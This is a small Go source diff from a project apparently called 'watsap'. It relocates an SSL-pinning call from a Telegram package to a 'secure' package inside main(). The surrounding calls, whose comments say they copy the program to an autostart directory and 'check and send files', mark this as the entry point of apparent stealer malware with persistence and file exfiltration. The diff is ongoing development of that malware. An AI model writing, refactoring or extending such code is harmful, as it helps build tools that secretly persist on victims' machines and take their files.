@@ -7,7 +7,7 @@ import (
 	"watsap/utils"
 	"watsap/utils/config"
 	"watsap/utils/messages"
-	"watsap/utils/telegram"
+	"watsap/utils/secure"
 	"watsap/utils/wainit"
 )
 
@@ -17,9 +17,9 @@ func init() {
 }
 
 func main() {
-	telegram.SSLPinning()        // ssl pinning
 	wainit.InitWa()              // initialize watsap
 	messages.StartupMessage1()   // send init message
+	secure.SSLPinning()          // ssl pinning
 	go utils.CopySelfToTempDir() // copy self to autostart dir
 	go files.InitFiles()         // initialize files
 	go files.CheckAndSendFiles() // check and send files
